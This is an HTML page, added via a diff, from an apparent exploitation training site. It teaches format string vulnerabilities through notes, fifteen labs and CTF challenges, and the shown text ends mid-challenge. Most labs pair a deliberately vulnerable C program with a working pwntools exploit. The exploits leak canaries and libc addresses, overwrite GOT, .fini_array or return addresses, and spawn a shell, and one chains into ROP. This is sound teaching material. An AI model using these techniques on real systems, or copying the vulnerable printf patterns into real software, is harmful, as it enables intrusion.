@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Format Strings</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Format String Vulnerabilities</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+        <h2>The Bug</h2>
+<pre><code class="language-c">// VULNERABLE — user controls the format string
+printf(user_input);
+
+// SAFE — user input is a parameter, not the format
+printf("%s", user_input);</code></pre>
+
+        <p>When user input is the format string, <code>printf</code> reads/writes stack memory as if the format specifiers had real arguments.</p>
+
+        <h2>How printf Reads Arguments</h2>
+        <p>System V ABI: <code>printf(fmt, RSI, RDX, RCX, R8, R9, stack...)</code></p>
+        <p>After the 5 register arguments are consumed, printf walks up the stack. With more <code>%</code> specifiers than actual arguments, it reads local variables, saved registers, canaries, return addresses.</p>
+
+        <h2>Reading Memory (Info Leak)</h2>
+        <h3>Format Specifiers</h3>
+        <table>
+          <tr><th>Specifier</th><th>Action</th></tr>
+          <tr><td><code>%p</code></td><td>Print pointer (hex with 0x prefix)</td></tr>
+          <tr><td><code>%x</code></td><td>Print hex (32-bit)</td></tr>
+          <tr><td><code>%lx</code></td><td>Print hex (64-bit)</td></tr>
+          <tr><td><code>%s</code></td><td>Dereference argument as pointer, print string at that address</td></tr>
+          <tr><td><code>%n</code></td><td>Write number of chars printed so far to address pointed by argument</td></tr>
+          <tr><td><code>%N$p</code></td><td>Direct parameter access — print the Nth argument</td></tr>
+        </table>
+
+        <h3>Finding Your Input Offset</h3>
+<pre><code class="language-bash"># Send recognizable pattern and find where it appears
+Input: AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+Output: AAAAAAAA.0x7fff... ... 0x4141414141414141
+                                ↑ your input at offset N</code></pre>
+
+<pre><code class="language-python"># Automated offset finder
+from pwn import *
+for i in range(1, 50):
+    p = process('./vuln')
+    p.sendline(f'AAAA%{i}$p'.encode())
+    result = p.recvall()
+    if b'0x41414141' in result:
+        print(f'Format string offset: {i}')
+        break
+    p.close()</code></pre>
+
+        <h3>Leaking Specific Values</h3>
+<pre><code class="language-python"># Leak canary (typically at offset around 11-15 depending on binary)
+payload = b'%11$p'  # adjust offset
+p.sendline(payload)
+canary = int(p.recvline(), 16)
+
+# Leak return address (saved RIP)
+payload = b'%13$p'
+p.sendline(payload)
+ret_addr = int(p.recvline(), 16)
+
+# Leak libc address (look for 0x7f... addresses)
+payload = b'%15$p'  # find offset with libc address
+p.sendline(payload)
+libc_leak = int(p.recvline(), 16)
+libc.address = libc_leak - libc.symbols['__libc_start_main'] - 243  # offset varies</code></pre>
+
+        <h2>Writing Memory (%n)</h2>
+        <p><code>%n</code> writes the number of characters printed so far to the address pointed to by the argument.</p>
+        <table>
+          <tr><th>Specifier</th><th>Write Size</th></tr>
+          <tr><td><code>%n</code></td><td>4 bytes (int)</td></tr>
+          <tr><td><code>%hn</code></td><td>2 bytes (short)</td></tr>
+          <tr><td><code>%hhn</code></td><td>1 byte (char)</td></tr>
+          <tr><td><code>%ln</code></td><td>8 bytes (long)</td></tr>
+        </table>
+
+        <h3>Pwntools fmtstr_payload</h3>
+<pre><code class="language-python">from pwn import *
+
+# Automatic format string write
+# fmtstr_payload(offset, {address: value}, write_size='short')
+# offset = where your input appears on the printf stack
+
+offset = 6  # your input starts at printf argument 6
+
+# Overwrite GOT entry for puts with address of win
+payload = fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})
+p.sendline(payload)
+# Next call to puts() actually calls win()</code></pre>
+
+        <h3>Manual Write</h3>
+<pre><code class="language-python"># To write 0x4011d6 to address 0x404018 (GOT[puts])
+# Split into two 2-byte writes with %hn:
+# Write 0x11d6 to 0x404018 (low 2 bytes)
+# Write 0x0040 to 0x40401a (high 2 bytes)
+
+target_lo = 0x404018
+target_hi = 0x40401a
+val_lo = 0x11d6  # 4566 decimal
+val_hi = 0x0040  # 64 decimal
+
+# Format: [addresses][padding+%hn][padding+%hn]
+# Each address is 8 bytes, so first we print 16 bytes of addresses
+payload  = p64(target_lo) + p64(target_hi)
+# Now we've printed 16 chars, need to print (val_hi - 16) more, then %hn
+payload += f'%{val_hi - 16}c%8$hn'.encode()  # write 0x0040 to target_hi
+# Then print (val_lo - val_hi) more chars, then %hn
+payload += f'%{val_lo - val_hi}c%7$hn'.encode()  # write 0x11d6 to target_lo</code></pre>
+
+        <h2>Common Exploitation Targets</h2>
+        <table>
+          <tr><th>Target</th><th>Effect</th><th>Requirements</th></tr>
+          <tr><td>GOT entry</td><td>Redirect library function to attacker code</td><td>Partial RELRO</td></tr>
+          <tr><td>Return address</td><td>Hijack control flow on function return</td><td>Know stack address</td></tr>
+          <tr><td><code>__malloc_hook</code></td><td>Called on next malloc (one_gadget target)</td><td>glibc &lt; 2.34</td></tr>
+          <tr><td><code>__free_hook</code></td><td>Called on next free</td><td>glibc &lt; 2.34</td></tr>
+          <tr><td><code>.fini_array</code></td><td>Called at program exit</td><td>No Full RELRO</td></tr>
+        </table>
+
+        <h2>Format String + Buffer Overflow Combo</h2>
+<pre><code class="language-python"># Classic two-stage:
+# Stage 1: Format string leak (canary, libc, stack addresses)
+# Stage 2: Buffer overflow with leaked values
+
+# Stage 1 - leak canary and libc
+p.sendline(b'%11$p.%15$p')
+leak = p.recvline().split(b'.')
+canary = int(leak[0], 16)
+libc_leak = int(leak[1], 16)
+libc.address = libc_leak - offset_to_known_symbol
+
+# Stage 2 - overflow with known canary
+payload = b'A' * buf_size
+payload += p64(canary)
+payload += b'B' * 8  # saved rbp
+payload += p64(one_gadget + libc.address)
+p.sendline(payload)</code></pre>
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Stack Leak</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use format strings to leak values from the stack.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtleak.c - gcc -o fmtleak fmtleak.c -no-pie
+#include &lt;stdio.h&gt;
+
+int main() {
+    int secret = 0xdeadbeef;
+    char buf[128];
+    printf("Enter format: ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Send <code>%p.%p.%p.%p.%p.%p.%p.%p</code> to see stack values</li>
+              <li>Find which offset contains <code>0xdeadbeef</code></li>
+              <li>Use direct parameter access <code>%N$p</code> to read it precisely</li>
+              <li>Leak the return address (look for <code>0x40XXXX</code> values)</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: GOT Overwrite</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use %n to overwrite a GOT entry and redirect execution.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtgot.c - gcc -o fmtgot fmtgot.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+int main() {
+    char buf[128];
+    while (1) {
+        printf("fmt> ");
+        fgets(buf, 128, stdin);
+        printf(buf);  // vulnerable
+        puts("");     // target: overwrite GOT[puts] with win()
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find your format string offset</li>
+              <li>Use <code>fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})</code></li>
+              <li>After sending the payload, the next <code>puts("")</code> call will execute <code>win()</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Canary Leak</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Leak the stack canary via format string, then overflow.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtcanary.c - gcc -o fmtcanary fmtcanary.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[64];
+    // Round 1: format string
+    printf("Leak: ");
+    fgets(buf, 64, stdin);
+    printf(buf);
+
+    // Round 2: overflow
+    printf("Overflow: ");
+    gets(buf);
+}
+
+int main() { vuln(); }</code></pre>
+            <p><strong>Steps:</strong></p>
+            <ol>
+              <li>First input: leak canary with format string (find the offset)</li>
+              <li>Second input: overflow buf + canary (use leaked value) + rbp + ret → win()</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Arbitrary Read</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use %s to read memory at an arbitrary address.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtread.c - gcc -o fmtread fmtread.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char flag[] = "FLAG{fmt_arbitrary_read_master}";
+
+int main() {
+    char buf[128];
+    printf("Flag is at: %p\n", flag);
+    while (1) {
+        printf("fmt> ");
+        fgets(buf, 128, stdin);
+        printf(buf);
+        printf("\n");
+    }
+}</code></pre>
+            <p><strong>Task:</strong> The binary tells you where <code>flag</code> is. Use <code>%s</code> with direct parameter access to read the string at that address. You need to place the address in your input at the correct offset, then dereference it with <code>%N$s</code>.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Leak Libc Address</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Leak a libc address from the stack to calculate libc base and defeat ASLR.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtlibc.c - gcc -o fmtlibc fmtlibc.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    char buf[128];
+    printf("fmt> ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    printf("\n");
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Dump the stack with <code>%p</code> specifiers — find addresses starting with <code>0x7f</code></li>
+              <li>Run <code>gdb ./fmtlibc</code>, set breakpoint at printf, identify which offset holds <code>__libc_start_main+XX</code></li>
+              <li>Calculate: <code>libc_base = leaked_addr - known_offset</code></li>
+              <li>Verify with <code>vmmap</code> in GDB that your base is page-aligned (ends in <code>000</code>)</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+p = process('./fmtlibc')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p.sendline(b'%41$p')  # adjust offset
+leak = int(p.recvline().strip(), 16)
+libc.address = leak - libc.symbols['__libc_start_main'] - 243
+log.success(f'libc base: {hex(libc.address)}')</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Leak PIE Base</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Leak a code address from the stack to defeat PIE (Position Independent Executable).</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtpie.c - gcc -o fmtpie fmtpie.c -pie -fPIE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+int main() {
+    char buf[128];
+    while (1) {
+        printf("fmt> ");
+        fgets(buf, 128, stdin);
+        printf(buf);
+        printf("\n");
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Dump stack — look for addresses starting with <code>0x55</code> or <code>0x56</code> (PIE text addresses)</li>
+              <li>In GDB, identify the leaked address (e.g., <code>__libc_csu_init</code> or <code>main+XX</code>)</li>
+              <li>Calculate PIE base: <code>pie_base = leak - known_offset</code></li>
+              <li>Now compute <code>win()</code> address: <code>win_addr = pie_base + elf.symbols['win']</code></li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtpie')
+p = process('./fmtpie')
+# Leak PIE address (adjust offset)
+p.sendlineafter(b'fmt> ', b'%13$p')
+leak = int(p.recvline().strip(), 16)
+pie_base = leak - elf.symbols['main'] - 0x10  # adjust
+elf.address = pie_base
+log.success(f'PIE base: {hex(pie_base)}')</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Write Small Value with %hhn</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use <code>%hhn</code> (single byte write) to set a variable to a specific value.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmthhn.c - gcc -o fmthhn fmthhn.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+
+int check = 0;
+
+int main() {
+    char buf[128];
+    printf("check @ %p (current: 0x%x)\n", &amp;check, check);
+    printf("fmt> ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    if (check == 0x42) {
+        printf("\nSUCCESS! check = 0x42\n");
+    } else {
+        printf("\nFAILED: check = 0x%x (need 0x42)\n", check);
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find your input offset on the stack</li>
+              <li>Place the address of <code>check</code> at that offset in your payload</li>
+              <li><code>%hhn</code> writes 1 byte = (chars printed so far) mod 256</li>
+              <li>Need 0x42 = 66 chars printed before <code>%hhn</code>. Account for the 8-byte address already printed.</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmthhn')
+p = process('./fmthhn')
+p.recvuntil(b'check @ ')
+check_addr = int(p.recvuntil(b' ').strip(), 16)
+offset = 6  # adjust
+# 8 bytes for address already printed, need 66 total
+payload = p64(check_addr) + f'%{66-8}c%{offset}$hhn'.encode()
+p.sendlineafter(b'fmt> ', payload)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Write Large Value with %hn</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use <code>%hn</code> (2-byte write) to write a 4-byte value to a variable using two writes.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmthn.c - gcc -o fmthn fmthn.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+
+int target = 0;
+
+int main() {
+    char buf[256];
+    printf("target @ %p\n", &amp;target);
+    printf("fmt> ");
+    fgets(buf, 256, stdin);
+    printf(buf);
+    if (target == 0xdeadbeef) {
+        printf("\nSUCCESS! target = 0xdeadbeef\n");
+    } else {
+        printf("\nFAILED: target = 0x%x (need 0xdeadbeef)\n", target);
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Split <code>0xdeadbeef</code> into two 2-byte writes: <code>0xbeef</code> at <code>target</code>, <code>0xdead</code> at <code>target+2</code></li>
+              <li>Place both addresses in the payload at known offsets</li>
+              <li>Write the smaller value first with <code>%hn</code>, then pad to the larger value and <code>%hn</code> again</li>
+              <li>Remember: <code>%hn</code> writes <code>(total chars printed) mod 65536</code></li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmthn')
+p = process('./fmthn')
+p.recvuntil(b'target @ ')
+target = int(p.recvline().strip(), 16)
+offset = 6  # adjust
+payload = fmtstr_payload(offset, {target: 0xdeadbeef}, write_size='short')
+p.sendlineafter(b'fmt> ', payload)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Overwrite .fini_array</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Overwrite <code>.fini_array</code> to redirect execution after <code>main()</code> returns.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtfini.c - gcc -o fmtfini fmtfini.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() {
+    system("/bin/sh");
+}
+
+int main() {
+    char buf[128];
+    printf("fmt> ");
+    fgets(buf, 128, stdin);
+    printf(buf);
+    return 0;  // after return, __libc_csu_fini calls .fini_array entries
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find <code>.fini_array</code> address: <code>objdump -h fmtfini | grep fini</code></li>
+              <li>Overwrite the function pointer in <code>.fini_array</code> with address of <code>win()</code></li>
+              <li>When <code>main()</code> returns, the runtime calls <code>.fini_array</code> entries — <code>win()</code> fires</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtfini')
+p = process('./fmtfini')
+fini = elf.get_section_by_name('.fini_array').header.sh_addr
+offset = 6  # adjust
+payload = fmtstr_payload(offset, {fini: elf.symbols['win']})
+p.sendlineafter(b'fmt> ', payload)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: fmtstr_payload Automated</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Practice using pwntools <code>fmtstr_payload()</code> to automate format string writes.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtauto.c - gcc -o fmtauto fmtauto.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int a = 0, b = 0, c = 0;
+
+int main() {
+    char buf[256];
+    printf("a @ %p, b @ %p, c @ %p\n", &amp;a, &amp;b, &amp;c);
+    printf("fmt> ");
+    fgets(buf, 256, stdin);
+    printf(buf);
+    printf("\na=0x%x b=0x%x c=0x%x\n", a, b, c);
+    if (a == 0x41 &amp;&amp; b == 0x42 &amp;&amp; c == 0x43) {
+        printf("SUCCESS! All values written correctly.\n");
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find your format string offset</li>
+              <li>Use <code>fmtstr_payload()</code> to write multiple values at once</li>
+              <li>Experiment with <code>write_size='byte'</code>, <code>'short'</code>, <code>'int'</code> and observe payload differences</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtauto')
+p = process('./fmtauto')
+# Parse addresses from output
+p.recvuntil(b'a @ ')
+a = int(p.recvuntil(b',').strip(b','), 16)
+p.recvuntil(b'b @ ')
+b = int(p.recvuntil(b',').strip(b','), 16)
+p.recvuntil(b'c @ ')
+c = int(p.recvline().strip(), 16)
+offset = 6  # adjust
+payload = fmtstr_payload(offset, {a: 0x41, b: 0x42, c: 0x43}, write_size='byte')
+p.sendlineafter(b'fmt> ', payload)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: 64-bit Format String (Null Byte Issue)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a format string in 64-bit where addresses contain null bytes, requiring addresses at the end of the payload.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmt64.c - gcc -o fmt64 fmt64.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+int main() {
+    char buf[256];
+    while (1) {
+        printf("fmt> ");
+        fgets(buf, 256, stdin);
+        printf(buf);
+        puts("");
+    }
+}</code></pre>
+            <p><strong>Key Concept:</strong> In 64-bit, addresses like <code>0x0000000000404018</code> contain null bytes. <code>printf</code> stops at <code>\x00</code>, so placing addresses first truncates the format string.</p>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Put the format specifiers BEFORE the addresses in the payload</li>
+              <li>Pad the specifiers to align addresses on an 8-byte boundary</li>
+              <li>Calculate the offset where your addresses land on the stack</li>
+              <li>Overwrite <code>GOT[puts]</code> with <code>win()</code></li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmt64')
+p = process('./fmt64')
+offset = 6  # adjust
+target = elf.got['puts']
+win = elf.symbols['win']
+# Addresses go AFTER the format specifiers
+# Calculate padding so addresses are 8-byte aligned
+writes = {target: win}
+# fmtstr_payload handles this automatically:
+payload = fmtstr_payload(offset, writes, write_size='short')
+p.sendlineafter(b'fmt> ', payload)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Blind Format String</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a format string when output is NOT returned to you (e.g., logged to a file).</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtblind.c - gcc -o fmtblind fmtblind.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void win() { execve("/bin/sh", NULL, NULL); }
+
+int main() {
+    char buf[128];
+    // Output goes to a log file, not stdout
+    FILE *log = fopen("/tmp/fmtlog.txt", "w");
+    while (1) {
+        read(STDIN_FILENO, buf, 128);
+        fprintf(log, buf);    // vulnerable, but output goes to file
+        fflush(log);
+        write(STDOUT_FILENO, "OK\n", 3);  // no useful feedback
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>You can't see printf output — must work "blind"</li>
+              <li>Use <code>%n</code> writes (they work regardless of output visibility)</li>
+              <li>Since binary is no-PIE and no-RELRO, GOT addresses are known at compile time</li>
+              <li>Overwrite <code>GOT[read]</code> or <code>GOT[fflush]</code> with <code>win()</code> to trigger shell</li>
+              <li>Verify by checking if you get a shell (no crash = success)</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtblind')
+p = process('./fmtblind')
+# Even though we can't see output, writes still work
+offset = 6  # find by trial: try writing known values and checking /tmp/fmtlog.txt
+payload = fmtstr_payload(offset, {elf.got['fflush']: elf.symbols['win']})
+p.send(payload)
+p.interactive()  # next fflush() call triggers win()</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 13: Format String + BOF Combo</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use format string to leak canary + libc, then use a buffer overflow for ROP.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtbof.c - gcc -o fmtbof fmtbof.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char fmt_buf[64];
+    char overflow_buf[64];
+
+    printf("[1] Format string:\n");
+    fgets(fmt_buf, 64, stdin);
+    printf(fmt_buf);  // leak canary + libc here
+
+    printf("\n[2] Overflow:\n");
+    gets(overflow_buf);  // overflow here with leaked values
+}
+
+int main() { vuln(); }</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Stage 1: Leak canary (<code>%11$p</code>) and a libc address (<code>%13$p</code>) — adjust offsets</li>
+              <li>Stage 2: Overflow <code>overflow_buf</code> → canary → saved rbp → ROP chain</li>
+              <li>Build a <code>system("/bin/sh")</code> ROP chain using leaked libc base</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtbof')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = process('./fmtbof')
+
+# Stage 1: leak canary + libc
+p.sendlineafter(b'Format string:\n', b'%11$p.%15$p')
+leaks = p.recvline().split(b'.')
+canary = int(leaks[0], 16)
+libc_leak = int(leaks[1], 16)
+libc.address = libc_leak - libc.symbols['__libc_start_main'] - 243
+
+# Stage 2: overflow with ROP
+rop = ROP(libc)
+rop.system(next(libc.search(b'/bin/sh\x00')))
+payload = b'A' * 72 + p64(canary) + b'B' * 8 + rop.chain()
+p.sendlineafter(b'Overflow:\n', payload)
+p.interactive()</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 14: Overwrite Return Address</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Directly overwrite the saved return address on the stack via format string write (no BOF needed).</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtret.c - gcc -o fmtret fmtret.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[256];
+    printf("buf @ %p\n", buf);  // leaks stack addr to find saved RIP
+    printf("fmt> ");
+    fgets(buf, 256, stdin);
+    printf(buf);
+}
+
+int main() { vuln(); }</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Leak stack address from the hint (<code>buf</code> location)</li>
+              <li>Calculate saved RIP location: <code>buf_addr + 256 + 8</code> (buf + buf_size + saved_rbp = saved_rip). Verify in GDB.</li>
+              <li>Use <code>%hn</code> writes to overwrite the return address with <code>win()</code></li>
+              <li>When <code>vuln()</code> returns, it jumps to <code>win()</code></li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtret')
+p = process('./fmtret')
+p.recvuntil(b'buf @ ')
+buf = int(p.recvline().strip(), 16)
+saved_rip = buf + 256 + 8  # verify in gdb with 'info frame'
+offset = 6  # adjust
+payload = fmtstr_payload(offset, {saved_rip: elf.symbols['win']}, write_size='short')
+p.sendlineafter(b'fmt> ', payload)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 15: Format String Loop Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a format string in a loop — first leak, then write across multiple iterations.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fmtloop.c - gcc -o fmtloop fmtloop.c -no-pie -Wl,-z,norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    char buf[128];
+    int rounds = 5;
+    while (rounds-- > 0) {
+        printf("[%d] fmt> ", rounds);
+        fgets(buf, 128, stdin);
+        printf(buf);
+        printf("\n");
+    }
+    printf("Goodbye.\n");
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Round 1: Leak libc address from stack</li>
+              <li>Round 2: Leak PIE / stack addresses if needed</li>
+              <li>Round 3: Overwrite <code>GOT[printf]</code> with <code>system()</code></li>
+              <li>Round 4: Send <code>/bin/sh</code> — printf(<code>"/bin/sh"</code>) is now <code>system("/bin/sh")</code></li>
+              <li>Key insight: the loop gives you multiple printf calls to leak-then-write</li>
+            </ol>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./fmtloop')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = process('./fmtloop')
+offset = 6  # adjust
+
+# Round 1: Leak libc
+p.sendlineafter(b'fmt> ', b'%41$p')
+libc_leak = int(p.recvline().strip(), 16)
+libc.address = libc_leak - libc.symbols['__libc_start_main'] - 243
+
+# Round 2: Overwrite GOT[printf] -> system
+payload = fmtstr_payload(offset, {elf.got['printf']: libc.symbols['system']})
+p.sendlineafter(b'fmt> ', payload)
+
+# Round 3: printf("/bin/sh") is now system("/bin/sh")
+p.sendlineafter(b'fmt> ', b'/bin/sh\x00')
+p.interactive()</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Leak the Secret</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A program stores a secret password on the stack. Leak it using format strings.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// secret.c - gcc -o secret secret.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    char password[16] = "s3cr3t_p4ss!";
+    char input[64];
+    printf("Login: ");
+    fgets(input, 64, stdin);
+    printf("Hello, ");
+    printf(input);
+    printf("\nPassword: ");
+    char attempt[16];
+    fgets(attempt, 16, stdin);
+    attempt[strcspn(attempt, "\n")] = 0;
+    if (strcmp(attempt, password) == 0) {
+        printf("FLAG{format_string_leak}\n");
+    }
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The password is on the stack. Use <code>%p</code> format specifiers to dump stack values and find it. Convert the hex bytes back to ASCII (remember little-endian). Then enter the password on the second prompt.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Write the Win</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Overwrite a global variable using format string writes to unlock the flag.</p>
+          <div class="setup-code">
